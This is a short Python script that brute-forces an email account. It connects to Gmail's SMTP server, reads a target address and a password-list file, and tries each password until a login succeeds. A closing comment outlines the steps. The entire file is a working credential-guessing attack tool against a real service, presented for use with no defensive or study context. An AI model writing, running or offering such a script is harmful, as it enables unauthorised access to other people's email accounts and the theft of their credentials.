#uploaded

import smtplib

smtpserver = smtplib.SMTP("smtp.gmail.com",587)
smtpserver.ehlo()
smtpserver.starttls()

user= input("enter the target's email address= ")
passfile= input("Enter the password file name= ")
file= open(passfile,"r")

for password in file:
    try:
        smtpserver.login(user,password)
        print("password found: "+password)
        break
    except smtplib.SMTPAuthenticationError:
        print("password not found: "+password)
        continue

"""
1) create smtp connection
2) input user name and pass file
3) open pass-file
4) for loop to check password list 
5) try password in socket connection place and for failed pass return error.
"""